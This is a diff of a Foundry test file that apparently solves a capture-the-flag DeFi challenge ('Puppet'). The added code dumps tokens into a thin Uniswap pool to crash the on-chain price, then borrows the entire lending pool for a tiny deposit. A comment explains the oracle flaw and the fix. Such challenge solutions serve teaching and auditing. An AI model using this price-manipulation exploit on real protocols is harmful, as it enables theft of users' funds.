@@ -117,8 +117,22 @@ contract Puppet is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testExploit1() public {
         /** EXPLOIT START **/
+
+        // NOTE: Here the exploit is due to the lending pool using one source of truth an on-chain amm price
+        // This sort of price can easily be manipulated especially if there is low liquidity. Consider using an off chain
+        // oracle such as chainlink or a robust TWAP oracle.
+
+        vm.startPrank(attacker);
+
+        dvt.approve(address(uniswapExchange), dvt.balanceOf(address(attacker)));
+        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(address(attacker)), 1 wei, block.timestamp + 1000);
+
+        uint256 depositAmount_ = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        puppetPool.borrow{value: depositAmount_}(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
